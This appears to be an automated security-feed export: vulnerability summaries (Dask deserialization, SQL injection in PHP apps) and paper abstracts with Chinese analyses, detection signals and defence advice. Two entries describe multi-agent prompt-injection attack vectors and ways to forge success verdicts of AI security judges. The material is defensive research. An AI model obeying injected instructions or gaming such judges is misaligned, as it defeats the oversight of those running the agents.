llm_summary.summary_zh: 该条目来自 NVD，记录 Dask 至 2026.8.0 版本中存在的一处反序列化安全问题（CVE-2026-95897）。漏洞位于 dask/array/core.py 中 Loader 组件所调用的 from_npy_stack 函数，该函数在加载以 .npy 堆栈形式存放的数组数据时，会对输入内容执行反序列化处理，而没有对数据来源与内容做充分的可信性校验。当受害者处理攻击者可控的 .npy 文件或目录时，恶意构造的序列化内容可能在加载过程中被解析，进而造成代码执行、数据被篡改或敏感信息泄露等后果。NVD 描述指出该攻击可远程发起，但 CVSS 3.1 评分为 5.5，向量为 AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L，说明利用需要一定权限前提并依赖用户交互（例如诱导用户加载恶意数据文件），对机密性、完整性和可用性的影响均为低。当前该问题已通过公开渠道披露，厂商在收到早期问题报告后尚未作出回应，因此大概率尚无官方修复版本。该 CVE 未列入 CISA KEV，也没有来自数据源的证据表明其已在野被利用。
llm_summary.why_it_matters_zh: Dask 广泛用于数据科学与大规模数组计算，库级反序列化缺陷一旦触发可导致代码执行；虽需交互与一定权限、影响评级为中等，但公开细节已披露且暂无官方回应，应尽快排查受影响版本并限制不可信数据加载。
llm_summary.impact_zh: 攻击者可借助恶意构造的 .npy 堆栈数据，在目标进程加载时触发反序列化，可能实现任意代码执行、数据篡改或信息读取；成功利用需具备一定权限并依赖用户交互，单次影响范围有限，CVSS 3.1 评分 5.5（中等）。

items.title: A weakness has been identified in AdithyaYelloju Restaurant-Management-System up to 7f0e7e84255e8fcfd488e83f8f91451bbbff6b9c. Affected by this issue is the function mysqli_query...
items.summary: A weakness has been identified in AdithyaYelloju Restaurant-Management-System up to 7f0e7e84255e8fcfd488e83f8f91451bbbff6b9c. Affected by this issue is the function mysqli_query of the file admin/display_menu.php of the component Search Form. This manipulation of the argument s1 causes sql injection. The attack can be initiated remotely. The exploit has been made available to the public and could be used for attacks. Continious delivery with rolling releases is used by this product. Therefore, no version details of affected nor updated releases are available. The project was informed of the problem early through an issue report but has not responded yet.

llm_summary.summary_zh: CVE-2026-95868 是 AdithyaYelloju Restaurant-Management-System（餐厅管理系统）中披露的一处 SQL 注入漏洞。受影响代码位于 admin/display_menu.php 文件，问题出在搜索表单组件对 mysqli_query 的调用环节：程序在构造数据库查询时，未对用户可控参数 s1 做充分的输入校验或参数化处理，直接将外部输入拼入 SQL 语句。攻击者只需向该搜索接口提交特制内容，即可改变原查询的语义，进而越权读取、篡改甚至删除后端数据库中的业务数据（如菜单、订单、账户等信息）。根据 NVD 给出的 CVSS 3.1 向量 AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L，该漏洞可经由网络远程触发，利用复杂度低、无需用户交互，但需要攻击者持有低权限身份（例如已登录的管理后台账号），对机密性、完整性和可用性的影响均评定为“低”，基础评分 6.3，属于中等风险。该产品采用滚动发布（rolling release）的持续交付模式，因此官方未给出确切的受影响版本与修复版本号，目前只能以提交 7f0e7e84255e8fcfd488e83f8f91451bbbff6b9c 及之前的代码作为参照边界。值得注意的是，漏洞细节与可用的利用代码已被公开，项目方虽通过 issue 报告提前获知该问题，但截至收录时尚未回应，也未发布修复版本。使用该系统的组织应结合自身资产暴露情况评估风险，重点关注管理后台是否需要对外开放。
llm_summary.why_it_matters_zh: 该 SQL 注入位于对外可访问的管理端搜索接口，利用门槛低且细节与利用代码已公开；厂商未回应、无修复版本，滚动发布模式下难以通过版本比对确认是否受影响，需尽快自行缓解。
llm_summary.impact_zh: 成功利用可绕过应用逻辑直接操作后端数据库，导致菜单、订单、账号等业务数据被未授权读取、篡改或删除，并可能为进一步横向渗透提供跳板；因利用需低权限账号，实际危害受限于攻击者的凭据获取能力。

items.summary: A weakness has been identified in itsourcecode Leave Management System 1.0. Impacted is an unknown function of the file /module/leavetype/index.php. This manipulation of the argument ID causes sql injection. The attack may be initiated remotely. The exploit has been made available to the public and could be used for attacks.

llm_summary.summary_zh: CVE-2026-95833 是一处披露于 NVD 的 SQL 注入漏洞, 影响 itsourcecode 出品的 Leave Management System 1.0。该产品是一套基于 PHP 的开源请假/休假管理系统, 常被中小型组织直接部署在内网或对公网开放的 Web 服务器上, 用于员工请假申请、审批流转与假期类型维护。根据描述, 漏洞位于文件 /module/leavetype/index.php 中一个未被公开命名的函数处理逻辑: 程序在接收并处理请求参数 ID 时, 未对其进行充分的类型校验与参数化处理, 导致外部可控输入被直接拼接进 SQL 语句, 从而形成 SQL 注入。攻击者可通过构造特制的 ID 参数值, 干扰后端数据库查询语义, 达到读取、篡改或删除数据库内容的效果, 具体可利用程度取决于数据库账号权限与应用上下文。CVSS 3.1 评分为 6.3(向量 AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L), 表明该漏洞可远程发起、利用门槛较低, 但需要攻击者具备一定的身份凭证或低权限账户, 对机密性、完整性与可用性的影响均被评定为低。该漏洞的利用细节已被公开, 意味着潜在攻击者可直接获取相关信息, 从而提高了被扫描和尝试利用的可能性。厂商在披露时未提供受影响产品的精确版本清单与修复说明, 也未提供官方补丁链接, 因此使用该系统的组织需要自行核实版本, 并优先通过网络层隔离与访问控制降低暴露面。
llm_summary.why_it_matters_zh: 受影响系统为常见的开源 PHP 请假管理平台, 若部署在公网且存在低权限账户, 攻击者可远程注入 SQL 读写业务数据。利用细节已公开, 扫描与尝试利用风险上升; 但 NVD 未标注 KEV 或在野利用, 尚无证据表明已被实际利用。
llm_summary.impact_zh: 成功利用可导致数据库中的员工信息、账号口令哈希、请假审批记录等敏感数据被非授权读取或篡改, 极端情况下可影响业务数据的完整性与可用性, 并可能成为进一步横向渗透的跳板。当前评分为中等, 未标注已入 KEV 或已在野利用。

items.title: Secrets That Survive Everything: Runtime Credential Exposure in Production Web Applications
items.summary: Pre-deployment secret scanning operates only on source code, never on what a production application serves. We document two exploitation chains in which Azure AD client credentials and APIM subscription keys from production JavaScript bundles enabled account takeover and mass data exposure. An authorized engagement covered approximately 2,000 enterprise web assets in one organization; 113 (5.65%) served live credentials. To quantify the shift-right gap, we built an independent Ground Truth (GT-194) of 194 secret-grade credentials through Claude Opus 4.7 extraction and manual analyst review, with the 247 LLM-extracted candidates independently validated by GPT-5.5 (Brennan-Prediger kappa = 0.676). The principal finding is structural: 13.9% of GT-194 (27 of 194) is surfaced only by manual analysis and recovered by none of the nine evaluated production scanners, a tool-agnostic blind spot the ground-truth model also misses. CryptoJS encrypted configuration separately defeats every static scanner: the credential exists only after decryption with a co-located key, reached only by runtime-aware detection. Combined coverage plateaus at 86.1%. Among the nine scanners, the best static scanner recovers 36.6% and the best runtime-aware scanner 77.8% (F1 = 0.818, McNemar p < 0.001); the ground-truth model is reported separately as a reference comparator, not an evaluated detector. On 63 of 86 secret-exposed applications (73.3%), the full Azure AD token-mint chain is co-located in one bundle, reachable from browser code. We characterize five paths by which credentials reach production undetected and present a layered runtime detection methodology and remediation framework. Recall is scoped to a single-organization Azure-heavy corpus.

llm_summary.summary_zh: 该论文聚焦一个长期被忽视的防护缺口：部署前的密钥扫描只作用于源代码仓库，而从不检查生产应用实际向浏览器下发的资源。作者在一次获得授权的评估中审计了某组织约 2,000 个企业级 Web 资产，发现其中 113 个（5.65%）在生产 JavaScript 打包文件中直接下发仍然有效的凭证，包括 Azure AD 客户端凭证与 API 管理（APIM）订阅密钥；这些凭证被证实可用于账户接管和大规模数据暴露，形成了完整的两条利用链。为量化“左移扫描”与真实运行态之间的差距，作者构建了独立的 Ground Truth 集合 GT-194，包含 194 条真实可用的密钥级凭证，构建流程为 Claude Opus 4.7 自动抽取加人工分析师复核，并由 GPT-5.5 对 247 条 LLM 抽取候选做独立校验（Brennan-Prediger kappa = 0.676）。核心发现具有结构性：GT-194 中有 13.9%（27/194）只能通过人工分析发现，所评估的九款生产级扫描器无一能够检出，属于与工具无关的系统性盲区；此外，采用 CryptoJS 加密的配置项可击败所有静态扫描器，因为凭证只有在与密钥同址存放并被运行时解密后才存在，只有具备运行时感知能力的检测才能触达。九款扫描器合计覆盖率仅停留在 86.1%，其中最佳静态扫描器召回 36.6%，最佳运行时感知扫描器为 77.8%（F1 = 0.818，McNemar p < 0.001）。研究还指出，在 86 个暴露密钥的应用中有 63 个（73.3%）其完整的 Azure AD 令牌签发链条与凭证同处一个打包文件，可从浏览器侧代码直接触达。作者归纳了凭证绕过检测进入生产环境的五条路径，并提出分层运行时检测方法论与修复框架。局限性在于召回率结论仅适用于单一组织的 Azure 重度依赖语料。
llm_summary.why_it_matters_zh: 它用量化证据说明纯左移密钥扫描存在结构性盲区：人工才能发现的样本九款扫描器全部漏检，运行时感知检测召回率也仅 77.8%。建议 SOC 与 AppSec 团队据此重新评估前端打包文件中凭证下发风险。
llm_summary.impact_zh: 适用于使用 Azure AD / APIM 及前端打包下发的企业 Web 应用、SPA 与微前端资产；可直接迁移到生产环境密钥暴露面测绘、扫描器选型与采购评估、以及运行时检测能力建设。
detection_signals_zh: 生产 JavaScript 打包文件中出现疑似云平台客户端 ID、租户 ID、订阅密钥等凭证形态字符串（需在运行时上下文匹配，而非仅静态正则）
前端资源在解密后于内存中生成凭证的动态行为，可由运行时插桩或浏览器侧监控捕获

items.title: Specification Before Generation: A Pre-Registered, Five-Model Paired Evaluation of a Specification Frame for LLM-Generated Code in Money, Time, Idempotency, and Access Tasks
items.summary: Code generated by large language models passes security checks at a rate that has barely moved in four years. In regulated backends, the defect classes that matter most are money arithmetic, time handling, retry safety, and access control. Teams answer with instruction files, yet the largest controlled study of instruction files to date found no benefit. This paper tests a narrower idea: generated code improves when the prompt carries a specification, a fixed preamble stating what must be true of the result. We pre-registered hypotheses, refuters, analysis code, and a one-shot generation rule, then ran 50 realistic backend tasks from finance, healthcare, and insurance practice through five frontier models from five vendor lineages, each task twice: bare, and preceded by a 267-word filled specification frame. Nine deterministic AST-based checkers scored the outputs. The Bandit security scanner, which knows nothing of the frame, scored them independently. The frame reduced defects in all five models (mean reduction 0.16 to 0.70 findings per task, every Holm-adjusted sign test significant, every bootstrap confidence interval excluding zero). Where the arms differed, the frame arm won 95 of 100 times. It never made any model worse in any domain. Bandit found 53 medium-or-high issues in the bare arm and 11 in the frame arm, in the same direction for every model. The effect was largest where a model's unprompted defaults were weakest: the frame supplies the discipline a model lacks. All 500 outputs, prompts, checkers, scoring code, and the pre-registration are published with a DOI, so any team can re-derive the result without trusting the author.

llm_summary.summary_zh: 该论文研究一个在受监管后端开发中反复出现却长期未被有效解决的问题：大语言模型生成的代码在安全与正确性检查上的通过率四年来几乎没有提升，而在金融、医疗、保险等受监管场景里，真正致命的缺陷类别集中在四类——金额运算（精度、舍入、货币单位）、时间处理（时区、夏令时、边界）、重试安全（幂等性）、访问控制。团队通常的应对方式是编写指令文件（instruction files），但迄今规模最大的对照研究显示这类做法并无收益。作者提出并检验一个更窄的假设：当提示词中携带一份“规格说明（specification）”——一段固定的前言，明确声明结果必须满足哪些性质——生成代码的质量会提升。研究采用预注册（pre-registration）方法，提前登记了假设、反驳条件（refuter）、分析代码以及“一次性生成、不得重试”的规则，以避免事后挑选结果。实验选取来自金融、医疗与保险实务的 50 个真实后端任务，交由来自五家不同厂商谱系的五个前沿模型执行，每个任务跑两次：一次裸提示（bare），一次在前面加上一段 267 词的、已填充的规格框架（specification frame）。评测使用九个基于 AST 的确定性检查器对输出打分，同时使用对框架毫不知情的 Bandit 安全扫描器做独立评分。结果显示：规格框架在全部五个模型上都降低了缺陷数（每任务平均减少 0.16 至 0.70 个发现，所有经 Holm 校正的符号检验均显著，所有 bootstrap 置信区间均不含零）；在两臂结果不同的情形中，框架臂在 100 次里赢下 95 次；在任何领域、任何模型上都没有变差。Bandit 在裸臂发现 53 个中高危问题，在框架臂仅发现 11 个，且每个模型方向一致。效应在模型自身默认习惯最弱的地方最大，说明框架补足了模型欠缺的工程纪律。全部 500 份输出、提示词、检查器、评分代码与预注册材料均以 DOI 公开，任何团队都能自行复现而不必信任作者。
llm_summary.why_it_matters_zh: 它给出了一个低成本、可复现的提示层缓解手段：在代码生成流水线中前置规格说明，能稳定减少金额、时间、幂等与访问控制四类高危缺陷，且不依赖特定厂商模型。对采用 AI 编码的受监管业务团队具有直接的工程与合规价值。
llm_summary.impact_zh: 可直接迁移到内部 AI 编码助手 / Copilot 类工具的提示模板治理、代码评审门禁与 CI 静态检查策略；尤其适用于金融账务、支付重试、时序调度、权限校验等模块的生成代码准入评估。
detection_signals_zh: 生成代码中金额运算缺少显式精度/舍入/货币单位约束
时间处理未声明时区与夏令时边界、缺少边界值处理
重试路径缺少幂等键或去重语义
访问控制检查缺失或仅在前端做校验
CI 中 SAST（如 Bandit）中高危发现集中于上述四类缺陷
defense_advice_zh: 在代码生成提示模板中固化统一的规格说明前言，明确金额、时间、幂等、访问控制四类不变量
在 CI 中并行保留确定性 AST 校验与独立 SAST 扫描，避免只依赖单一评分口径
按模型/按任务域分别度量缺陷率，跟踪规格框架的实际收益，避免一刀切
将规格框架视为补充而非替代：仍需人工评审与运行时防护
参考其公开的预注册与评分代码，在内部建立可复现的评估基线

items.title: Beyond Single-Model Injection: A Threat Model and Defense Architecture for Prompt Injection in Multi-Agent Systems
items.summary: Existing prompt injection research focuses on single-model chatbot scenarios, where an attacker manipulates one LLM through crafted input. Multi-agent systems amplify this threat through three mechanisms absent from single-model settings: inter-agent message passing creates injection channels invisible to perimeter defenses, shared tool access enables privilege escalation across agent boundaries, and trust propagation allows a compromised agent to influence upstream orchestrators. We construct a threat model enumerating 14 attack vectors across four categories: direct injection via user input (3 vectors), indirect injection via tool outputs (4 vectors), inter-agent injection via message passing (4 vectors), and cascading injection through orchestrator manipulation (3 vectors). Testing all 14 vectors against a 6-agent production-representative system, we find that 67% of agents are vulnerable to at least one scope violation even with system-prompt-level guardrails, and indirect injection via tool outputs succeeds in 43% of attempts. Four architectural defenses reduce overall injection success from 31.2% to 4.2%: message signing with provenance tracking (inter-agent injection down 91%), input/output sanitization at agent boundaries (indirect injection down 78%), privilege-scoped tool access per agent role (privilege escalation eliminated entirely), and anomaly detection on inter-agent communication patterns (84% of cascading attempts caught).

llm_summary.summary_zh: 该论文指出，现有提示注入（Prompt Injection）研究几乎都局限于单模型聊天机器人场景，即攻击者通过精心构造的输入操纵单个 LLM。作者认为多智能体（Multi-Agent）系统引入了三种单模型场景中不存在的放大机制：其一，智能体之间的消息传递形成了边界防御（perimeter defense）看不到的注入信道；其二，多个智能体共享工具访问权限，使得攻击者可以跨越智能体边界实现权限提升；其三，信任传播（trust propagation）机制允许一个已被攻陷的智能体反过来影响上游的编排者（orchestrator），从而污染整个任务链路。为系统化分析这一问题，作者构建了一个威胁模型，把攻击面归纳为四大类共 14 条攻击向量：通过用户输入的直接注入（3 条）、通过工具输出的间接注入（4 条）、通过消息传递的智能体间注入（4 条）、以及通过编排者操纵实现的级联注入（3 条）。作者在一个具有生产代表性的 6 智能体系统上对全部 14 条向量进行了测试，结果显示：即使部署了系统提示词层面的护栏，仍有 67% 的智能体至少对一种范围越权（scope violation）存在脆弱性；通过工具输出进行的间接注入成功率达 43%。随后作者评估了四种架构级防御：带来源追踪的消息签名（使智能体间注入下降 91%）、在智能体边界进行输入/输出净化（使间接注入下降 78%）、按智能体角色进行权限范围的工具访问控制（彻底消除权限提升）、以及对智能体间通信模式的异常检测（捕获 84% 的级联注入尝试）。四者组合将整体注入成功率从 31.2% 降至 4.2%。论文的贡献在于：首次系统性地把提示注入威胁建模扩展到多智能体拓扑，量化了各攻击向量的成功率，并给出了可落地的纵深防御架构，适合 LLM 应用架构师、AI 安全研究者与红蓝队成员阅读。
llm_summary.why_it_matters_zh: 多数企业正把 LLM 从单体聊天机器人演进为多智能体编排系统，而传统边界防护与单模型护栏对此类系统基本失效。本文给出了可量化的攻击面清单（14 条向量）和四种架构级缓解措施，为多智能体平台的安全设计提供了直接可参考的基线。
llm_summary.impact_zh: 适用于采用多智能体/工具调用编排的 AI 平台（如自动化运维 Agent、代码生成流水线、企业 RAG 助手、Agent 框架中间件）；其威胁分类法与防御组合可迁移到任何存在智能体间消息传递、共享工具权限与信任传递的架构。
detection_signals_zh: 智能体间消息缺少签名或来源溯源信息，出现无法验证来源的指令性内容
工具/插件返回内容中夹带指令式文本，且随后被智能体当作系统级指令执行
单个智能体调用了超出其角色权限范围的工具或接口，出现横向越权调用
下游智能体的输出异常反向修改上游编排者的任务计划或目标参数
智能体间通信模式出现偏离基线的频率、拓扑或消息长度突变（级联注入前兆）
同一会话内出现指令层级混淆：用户输入、工具输出与系统提示边界被混同处理
defense_advice_zh: 为智能体间消息引入签名与来源溯源（provenance），接收方必须校验发送方身份与消息完整性后再执行
在智能体边界强制执行输入/输出净化，明确区分数据与指令，禁止工具输出直接进入指令通道
按智能体角色实施最小权限的工具访问控制（privilege-scoped tool access），杜绝跨边界权限提升
对智能体间通信建立行为基线，部署异常检测以捕获级联注入与编排者操纵
避免隐含的全局信任传播：编排者应独立校验下游智能体的结论，而非直接继承其状态
在系统提示词护栏之外叠加架构级控制，不要依赖单一层面的防护

items.title: Forgeable Confirmation in Automated Computer Security Testing: Deterministic Rules versus AI Judges
items.summary: AI is increasingly used to automate computer security testing, and the tools must decide for themselves whether an attack succeeded. A finding that a deterministic rule confirms by observation is reported as fact, whereas one that an LLM judges exploitable is treated as an opinion. We ask whether the system under test can forge that confirmation. In offline security testing of a four-stage AI-assisted pipeline, nine of its fifteen confirmation mechanisms are forgeable, and forgeability is predicted entirely by whether the decision reads attacker-controlled data. We formalise this as an auditable attack surface and test it prospectively: on sixteen held-out mechanisms, predictions fixed before any attack separated forgeable from unforgeable mechanisms exactly, and across 12,203 mechanisms in public scanner templates the prediction was 99.9% accurate. Deterministic rules proved cheaper to forge than eight open-weight LLM judges, failing at 2% of attacker-controlled response content against a median of 50%. No implementation of one check was both robust and precise, and routing between a rule and an AI judge raised forgery to 99%. Moving the decisive evidence to a channel the attacker cannot write cuts attack success from 97% to 0%, and an escalate verdict recovers the sensitivity this costs. The protection fails when the scanned host is itself the adversary. The results bear on AI security agents and on benchmarks that score success by string matching.

llm_summary.summary_zh:
论文关注一个常被忽视的信任问题：当 AI 被用于自动化计算机安全测试（如自动化渗透、漏洞扫描流水线）时，工具必须自行判断一次攻击是否成功。作者指出当前实践存在不对称：若由确定性规则（deterministic rule）通过观察确认某发现，就被当作事实上报；若由大语言模型（LLM）判定为可利用，则被视为一种观点。由此提出核心研究问题——被测系统（system under test）能否伪造这种确认，使工具把失败误判为成功？

作者在一个四阶段 AI 辅助测试管线上做离线安全测试，发现其 15 个确认机制中有 9 个可被伪造，且可伪造性可以被一个单一因素完全预测：该判定是否读取了攻击者可控的数据。作者将其形式化为一个可审计的攻击面，并做前瞻性验证：在 16 个事先留出的机制上，任何攻击执行之前固定的预测恰好区分了可伪造与不可伪造机制；在公开扫描器模板的 12,203 个机制上，预测准确率为 99.9%。

对比实验显示，确定性规则比八个开源权重 LLM 裁判更容易被伪造：在攻击者可控响应内容仅占 2% 时规则即失败，而 LLM 裁判的中位数为 50%。此外，没有任何一个检查的实现能同时做到既鲁棒又精确；在规则与 AI 裁判之间做路由（routing）反而将伪造成功率推高到 99%。缓解方向是架构性的：把决定性证据移到一个攻击者无法写入的通道后，攻击成功率从 97% 降到 0%，而引入 escalate（升级裁决）判定可以恢复因此损失的灵敏度。该防护在被扫描主机本身就是对手的场景下失效。研究结论对 AI 安全代理的设计，以及以字符串匹配来判定成功与否的基准评测均具直接意义。本文属于离线方法学研究与形式化分析。
llm_summary.why_it_matters_zh: 它揭示 AI 安全代理存在系统性信任缺陷：攻击者只要控制被测目标的响应内容，就能让工具把失败当成功，污染扫描结论、漏洞报告与基准分数。任何构建自动化扫描或 AI 渗透代理的团队都应据此审查自身判定链路的可信度。
llm_summary.impact_zh: 直接影响 AI 辅助安全测试管线、自动化漏洞扫描器、以字符串匹配判分的安全基准与竞赛评测，以及各类 LLM 安全代理；可迁移到任何由被测目标反馈驱动最终判定的自动化系统（如自动化验证、红队编排、Agent 工具调用结果校验）。
detection_signals_zh: 确认判定所依赖的证据（响应体、banner、退出码、目标侧日志等）与攻击者可控通道重合
同一基准或扫描任务中，成功/失败判定仅由目标返回字符串的细微差异决定
使用字符串匹配判分的评测出现异常偏高的成功率或与人工复核结论严重背离
对高危发现仅由规则或单一 LLM 裁判拍板，缺少独立通道或二次升级裁决
规则与 LLM 裁判混合路由后，整体伪造/误报率反而上升
defense_advice_zh: 审计所有确认机制：凡读取攻击者可控数据的判定，一律标记为'观点'而非'事实'，并纳入可审计攻击面清单
将决定性证据转移到攻击者无法写入的通道（带外采集、独立观测器、时间侧信道等）后再做成功判定
对高危结论引入 escalate 升级裁决或人工复核，以弥补因证据外移而损失的灵敏度
谨慎设计规则与 LLM 裁判之间的路由策略，避免简单混合放大伪造面
基准与评测避免纯字符串匹配判分，改用独立可验证的证据采集
注意边界条件：当被扫描主机本身即对手时，此类防护会失效，需改为外部观测
